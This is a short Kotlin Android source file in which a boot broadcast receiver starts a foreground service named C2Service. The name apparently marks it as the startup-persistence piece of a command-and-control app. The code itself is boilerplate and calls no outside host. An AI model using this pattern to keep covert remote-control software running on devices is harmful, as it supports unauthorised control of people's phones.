package com.t.core
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
class BootReceiver : BroadcastReceiver() {
    override fun onReceive(c: Context, i: Intent) { VC.startFg(c, Intent(c, C2Service::class.java)) }
}
